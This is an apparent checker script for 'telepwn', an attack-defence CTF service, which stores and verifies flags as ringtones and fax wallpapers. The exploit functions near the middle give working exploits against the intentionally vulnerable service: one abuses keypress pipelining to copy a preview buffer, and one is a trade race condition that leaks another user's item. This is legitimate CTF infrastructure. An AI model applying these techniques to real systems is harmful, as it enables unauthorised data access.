from contextlib import asynccontextmanager
from logging import LoggerAdapter
from os import environ

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    DependencyInjector,
    AsyncSocket,
)

import client
import asyncio

from phone import BLOCK_NUM_SAMPLES, Phone, TelepwnError
from checker_util import (
    CheckerExceptionTranslator,
    PIN,
    ITEM_ID,
    db_get,
    db_set,
    random_noise,
)
from text_audio import (
    SpeechError,
    text_from_audio,
    text_to_audio,
)

from text_image import (
    text_from_fax,
    text_to_fax,
    FAX_PREVIEW_NUM_SAMPLES
)

service_port = int(environ.get("SERVICE_PORT", 9400))
checker = Enochecker('telepwn', service_port)
def app(): return checker.app


@asynccontextmanager
async def dial(log, di, purpose):
    async with Phone(log, await di.get(AsyncSocket), purpose) as phone:
        await client.start(phone)
        yield phone

async def stored_item(db: ChainDB):
    try:
        return await db_get(db, 'item')
    except KeyError:
        raise MumbleException('Checked item does not exist')


async def put_ringtone_data(db: ChainDB, log: LoggerAdapter, di: DependencyInjector, data):
    flag_id, flag_pin = ITEM_ID(), PIN()
    log.info(f"storing data in ringtone {flag_id} with pin {flag_pin}")

    samples = text_to_audio(data)
    async with dial(log, di, "putdata(0)") as phone:
        await client.create_ringtone(phone, flag_id, flag_pin, samples)
        await client.hangup(phone)

    await db_set(db, 'item', flag_id, flag_pin, len(samples))
    return f"ringtone_id={flag_id}"

async def check_ringtone_data(db: ChainDB, log: LoggerAdapter, di: DependencyInjector, data):
    flag_id, flag_pin, flag_num_samples = await stored_item(db)
    log.info(f"checking data in ringtone {flag_id} with pin {flag_pin}")

    async with dial(log, di, "getdata(0)") as phone:
        preview, full = await client.get_ringtone_full(phone, flag_id, flag_pin, flag_num_samples)
        await client.hangup(phone)

    if text_to_audio(data)[:client.RINGTONE_PREVIEW_NUM_SAMPLES] not in preview:
        raise MumbleException("flag missing from preview")
    if text_to_audio(data) not in full:
        raise MumbleException("flag missing from full")

async def put_wallpaper_data(db: ChainDB, log: LoggerAdapter, di: DependencyInjector, data):
    flag_id, flag_pin = ITEM_ID(), PIN()
    log.info(f"storing data in wallpaper {flag_id} with pin {flag_pin}")

    async with dial(log, di, "putdata(1)") as phone:
        log.info("encode flag fax start")
        flag_wallpaper = await text_to_fax(data)
        log.info("encode flag fax end")
        await client.create_wallpaper(phone, flag_id, flag_pin, flag_wallpaper)
        await client.hangup(phone)

    await db_set(db, "item", flag_id, flag_pin)
    return f"wallpaper_id={flag_id}"

async def check_wallpaper_data(db: ChainDB, log: LoggerAdapter, di: DependencyInjector, data):
    flag_id, flag_pin = await stored_item(db)
    log.info(f"checking data in wallpaper {flag_id} with pin {flag_pin}")

    # Check directly
    log.info("encode flag fax start")
    flag_wallpaper = await text_to_fax(data)
    log.info("encode flag fax end")
    async with dial(log, di, "getdata(1) - part 1") as phone:
        preview, full = await client.get_wallpaper_full(phone, flag_id, flag_pin)
        await client.hangup(phone)

    # TODO: check wallpaper preview
    if flag_wallpaper not in full:
        raise MumbleException("flag missing from full")

    # Check by trade
    trade_id, trade_pin = ITEM_ID(), PIN()
    trade_contents = random_noise()
    log.info("encode trade fax start")
    trade_wallpaper = await text_to_fax(trade_contents)
    log.info("encode trade fax end")
    async with dial(log, di, "getdata(1) - part 2") as phone:
        await client.create_wallpaper(phone, trade_id, trade_pin, trade_wallpaper)
        await client.offer_trade(phone, flag_id, trade_id, trade_pin)
        # Accept flag trade
        # TODO: split conn here?
        await client.view_offered_trade(phone, flag_id, flag_pin, trade_id)
        # Check accepted flag trade in both directions
        full_flag = await client.view_accepted_trade(phone, trade_id, trade_pin, flag_id)
        full_trade = await client.view_accepted_trade(phone, flag_id, flag_pin, trade_id) # XXX optional I guess

        await client.hangup(phone)

    if flag_wallpaper not in full_flag:
        raise MumbleException("flag missing from accepted trade")
    if trade_wallpaper not in full_trade: # XXX optional I guess
        raise MumbleException("trade missing from accepted trade")

DEFERRED_EXPLOIT = False

async def exploit_ringtone(log: LoggerAdapter, di: DependencyInjector, flag_id):
    leak_id, leak_pin = ITEM_ID(), PIN()
    log.info(f"leaking ringtone {flag_id} into new ringtone {leak_id}")

    #async with dial(log, di, "exploit(0) ARTIFICIAL LOAD") as phone:
    #    for _ in range(3):
    #        fake_wallpaper = await text_to_fax(random_noise())
    #        await client.create_wallpaper(phone, ITEM_ID(), PIN(), fake_wallpaper)

    async with dial(log, di, "exploit(0)") as phone:
        # Preview the target ringtone, loading its audio into the server-side
        # buffer.
        deferred_checks = []
        deferred_checks += await phone.recv_expect(
            "browse_items_or_create_item_or_view_offered_trades_or_view_accepted_trades_or_request_support",
            defer=DEFERRED_EXPLOIT
        )
        await phone.press("1")
        deferred_checks += await phone.recv_expect("enter_item_id_or_cancel", defer=DEFERRED_EXPLOIT)
        await phone.enter_number(flag_id)

        # While the preview plays, pipeline `* * 2 <id># <pin># 2 #`: repeat
        # the playback, back out of the menus, go into the create menu, create
        # a new ringtone and immediately stop recording. The recording stops
        # before a single block is received, so the server-side buffer is
        # preserved and saved as the new ringtone.
        keys = ""
        keys += "*" # cancel preview
        keys += "*" # cancel browse
        keys += "2" # create
        keys += f"{leak_id}#" # id
        keys += f"{leak_pin}#" # pin
        keys += "1" # ringtone (could also be wallpaper, doesn't really matter I think)
        keys += "#" # start recording
        keys += "#" # end recording
        num_key_blocks = await phone.press(keys)

        # Wait until it's over
        # We have to do it this way because thanks immediately goes back to the main 
        preview_samples_left = client.RINGTONE_PREVIEW_NUM_SAMPLES - num_key_blocks * BLOCK_NUM_SAMPLES
        preview_left = await phone.recv_audio(preview_samples_left, defer=DEFERRED_EXPLOIT)
        #thanks_left = await phone.recv_until_expect("thanks", preview_samples_left, defer=DEFERRED_EXPLOIT)
        deferred_checks += await phone.recv_expect("thanks", defer=DEFERRED_EXPLOIT)

        if DEFERRED_EXPLOIT:
            await client.resolve_deferred_checks(deferred_checks)
            await preview_left

        # We know the leaked copy's PIN, so listen to it
        # Use None as size -> will try max and extract.
        preview, full = await client.get_ringtone_full(phone, leak_id, leak_pin, None)

        await client.hangup(phone)

    return full

async def exploit_wallpaper(log: LoggerAdapter, di: DependencyInjector, flag_id):
    offerer_id, offerer_pin = ITEM_ID(), PIN()
    accepter_id, accepter_pin = ITEM_ID(), PIN()
    log.info(f"leaking wallpaper {flag_id} via trade on {offerer_id} and {accepter_id}")

    log.info("encode exploiter fax start")
    fake_wallpaper = await text_to_fax(random_noise())
    log.info("encode exploiter fax end")

    #async with dial(log, di, "exploit(1) ARTIFICIAL LOAD") as phone:
    #    for _ in range(3):
    #        fake_wallpaper = await text_to_fax(random_noise())
    #        await client.create_wallpaper(phone, ITEM_ID(), PIN(), fake_wallpaper)

    async with dial(log, di, "exploit(1) - A") as offerer, dial(log, di, "exploit(1) - B") as accepter:
        # A: Create wallpaper
        await client.create_wallpaper(offerer, offerer_id, offerer_pin, fake_wallpaper)
        # B: Create wallpaper
        await client.create_wallpaper(accepter, accepter_id, accepter_pin, fake_wallpaper)

        # A: Offer a trade
        await client.offer_trade(offerer, accepter_id, offerer_id, offerer_pin)

        # B: Start viewing the trade
        accepter_dcs = []
        accepter_dcs += await accepter.recv_expect(
            "browse_items_or_create_item_or_view_offered_trades_or_view_accepted_trades_or_request_support",
            defer=DEFERRED_EXPLOIT
        )
        await accepter.press("3")
        accepter_dcs += await client.authenticate(accepter, accepter_id, accepter_pin, defer=DEFERRED_EXPLOIT)
        accepter_dcs += await accepter.recv_expect("enter_offered_item_id_or_cancel", defer=DEFERRED_EXPLOIT)
        await accepter.enter_number(offerer_id)
        preview = await accepter.recv_audio(FAX_PREVIEW_NUM_SAMPLES, defer=DEFERRED_EXPLOIT)
        accepter_dcs += await accepter.recv_expect("repeat_preview_or_accept_trade_or_cancel", defer=DEFERRED_EXPLOIT)

        if DEFERRED_EXPLOIT:
            preview = await preview
            await client.resolve_deferred_checks(accepter_dcs)
            accepter_dcs = []

        # A: Change the trade to point at the flag
        await client.offer_trade(offerer, flag_id, offerer_id, offerer_pin)

        # B: Accept the trade
        # This accepts the new trade, even though it is not B's to accept
        await accepter.press("2")
        accepter_dcs += await accepter.recv_expect("trade_accepted")
        accepter_dcs += await accepter.recv_expect("enter_offered_item_id_or_cancel")
        await accepter.cancel()

        if DEFERRED_EXPLOIT:
            await client.resolve_deferred_checks(accepter_dcs)
            accepter_dcs = []

        # A: View the flag accepted trade
        full = await client.view_accepted_trade(offerer, offerer_id, offerer_pin, flag_id)

        # A, B: hang up
        await client.hangup(offerer)
        await client.hangup(accepter)

        log.info(f"exploit done")

    return full

@checker.putflag(0)
async def put_ringtone_flag(task: PutflagCheckerTaskMessage, db: ChainDB, log: LoggerAdapter, di: DependencyInjector):
    async with CheckerExceptionTranslator():
        return await put_ringtone_data(db, log, di, task.flag)


@checker.getflag(0)
async def get_ringtone_flag(task: GetflagCheckerTaskMessage, db: ChainDB, log: LoggerAdapter, di: DependencyInjector):
    async with CheckerExceptionTranslator():
        await check_ringtone_data(db, log, di, task.flag)

@checker.putnoise(0)
async def put_ringtone_noise(task: PutnoiseCheckerTaskMessage, db: ChainDB, log: LoggerAdapter, di: DependencyInjector):
    async with CheckerExceptionTranslator():
        noise = random_noise()
        await db_set(db, 'noise', noise)
        await put_ringtone_data(db, log, di, noise)


@checker.getnoise(0)
async def get_ringtone_noise(task: GetnoiseCheckerTaskMessage, db: ChainDB, log: LoggerAdapter, di: DependencyInjector):
    async with CheckerExceptionTranslator():
        try:
            noise = await db_get(db, 'noise')
            noise = noise if not isinstance(noise, list) else noise[0]
        except KeyError:
            raise MumbleException("Could not retrieve stored noise")

        await check_ringtone_data(db, log, di, noise)

@checker.exploit(0, 0)
async def ringtone_exploit(task: ExploitCheckerTaskMessage, db: ChainDB, log: LoggerAdapter, di: DependencyInjector):
    async with CheckerExceptionTranslator():
        if task.attack_info is None:
            raise InternalErrorException("Missing attack info")
        try:
            flag_id = int(task.attack_info.split("=", 1)[1])
        except (IndexError, ValueError):
            raise InternalErrorException(f"Unexpected attack info: {task.attack_info}")

        audio = await exploit_ringtone(log, di, flag_id)
        #for _ in range(1):
        #    await asyncio.sleep(1.0)
        #    _ = await exploit_ringtone(log, di, flag_id)

        try:
            return text_from_audio(audio)
        except SpeechError as e:
            raise MumbleException(f"could not decode leaked ringtone: {e}")

@checker.putflag(1)
async def put_wallpaper_flag(task: PutflagCheckerTaskMessage, db: ChainDB, log: LoggerAdapter, di: DependencyInjector):
    async with CheckerExceptionTranslator():
        return await put_wallpaper_data(db, log, di, task.flag)


@checker.getflag(1)
async def get_wallpaper_flag(task: GetflagCheckerTaskMessage, db: ChainDB, log: LoggerAdapter, di: DependencyInjector):
    async with CheckerExceptionTranslator():
        await check_wallpaper_data(db, log, di, task.flag)

@checker.putnoise(1)
async def put_wallpaper_noise(task: PutnoiseCheckerTaskMessage, db: ChainDB, log: LoggerAdapter, di: DependencyInjector):
    async with CheckerExceptionTranslator():
        noise = random_noise()
        await db_set(db, 'noise', noise)
        await put_wallpaper_data(db, log, di, noise)


@checker.getnoise(1)
async def get_wallpaper_noise(task: GetnoiseCheckerTaskMessage, db: ChainDB, log: LoggerAdapter, di: DependencyInjector):
    async with CheckerExceptionTranslator():
        try:
            noise = await db_get(db, 'noise')
            noise = noise if not isinstance(noise, list) else noise[0]
        except KeyError:
            raise MumbleException("Could not retrieve stored noise")

        await check_wallpaper_data(db, log, di, noise)

@checker.exploit(1, 1)
async def wallpaper_exploit(task: ExploitCheckerTaskMessage, db: ChainDB, log: LoggerAdapter, di: DependencyInjector):
    async with CheckerExceptionTranslator():
        if task.attack_info is None:
            raise InternalErrorException("Missing attack info")
        try:
            flag_id = int(task.attack_info.split("=", 1)[1])
        except (IndexError, ValueError):
            raise InternalErrorException(f"Unexpected attack info: {task.attack_info}")

        audio = await exploit_wallpaper(log, di, flag_id)
        #for _ in range(1):
        #    await asyncio.sleep(1.0)
        #    await exploit_wallpaper(log, di, flag_id)

        log.info("decode fax start")
        text = await text_from_fax(audio)
        log.info("decode fax done")
        if text is None:
            log.error("decode fax error")
            raise MumbleException("fax decode error")

        return text

if __name__ == "__main__":
    print("Please implement me")
